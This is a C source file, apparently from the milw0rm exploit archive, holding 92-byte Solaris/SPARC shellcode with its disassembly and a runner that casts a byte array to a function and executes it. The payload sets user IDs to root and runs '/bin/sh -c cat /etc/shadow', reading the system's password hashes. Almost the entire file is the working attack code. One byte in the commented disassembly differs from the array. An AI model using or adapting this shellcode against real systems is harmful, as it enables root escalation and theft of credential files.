/*
 * bunker_sparc_exec.c V1.0 - Sat Oct 21 17:45:27 CEST 2006
 *
 * Solaris/sparc bytecode that executes command after setreuid
 * (92 bytes + cmd)
 *
 * setreuid(0, 0) + execve("/bin/sh", ["/bin/sh","-c","cmd"], NULL);
 *
 * bunker - http://rawlab.mindcreations.com
 * 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
 *
 * Load address of _start+12 in %o7
 *  0x10250:            20 bf ff ff  bn,a      -0x4     <0x1024c>
 *  0x10254:            20 bf ff ff  bn,a      -0x4     <0x10250>
 *  0x10258:            7f ff ff ff  call      -0x4     <0x10254>
 *
 * setreuid(0, 0);
 *  0x1025c:            90 18 40 01  xor       %g1, %g1, %o0
 *  0x10260:            92 18 40 01  xor       %g1, %g1, %o1
 *  0x10264:            82 10 20 ca  mov       0xca, %g1
 *  0x10268:            91 d0 20 08  ta        0x8
 *
 * execve("/bin/sh", ["/bin/sh", "-c", "cmd"], NULL);
 *  0x1026c:            90 03 e0 44  add       %o7, 0x44, %o0
 *  0x10270:            90 23 e0 20  sub       %o7, 0x20, %o0
 *  0x10274:            a2 02 20 0c  add       %o0, 0xc, %l1
 *  0x10278:            a4 02 20 10  add       %o0, 0x10, %l2
 *  0x1027c:            c0 2a 20 07  clrb      [%o0 + 0x7]
 *  0x10280:            c0 2a 20 0e  clrb      [%o0 + 0xe]
 *  0x10284:            d0 23 ff e0  st        %o0, [%o7 - 0x20]
 *  0x10288:            e2 23 ff e4  st        %l1, [%o7 - 0x1c]
 *  0x1028c:            e4 23 ff e8  st        %l2, [%o7 - 0x18]
 *  0x10290:            c0 23 ff ec  clr       [%o7 - 0x14]
 *  0x10294:            82 10 20 3b  mov       0x3b, %g1
 *  0x10298:            91 d0 20 08  ta        0x8
 * "/bin/sh     -c  "
 * "cat /etc/shadow"
 */

char sc[]=      "\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff"
"\x90\x18\x40\x01\x92\x18\x40\x01\x82\x10\x20\xca\x91\xd0\x20\x08"
"\x90\x03\xe0\x44\x92\x23\xe0\x20\xa2\x02\x20\x0c\xa4\x02\x20\x10"
"\xc0\x2a\x20\x07\xc0\x2a\x20\x0e\xd0\x23\xff\xe0\xe2\x23\xff\xe4"
"\xe4\x23\xff\xe8\xc0\x23\xff\xec\x82\x10\x20\x3b\x91\xd0\x20\x08"
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20\x20\x2d\x63\x20\x20"
"cat /etc/shadow";

main() { int(*f)()=(int(*)())sc;f(); }

// milw0rm.com [2006-10-21]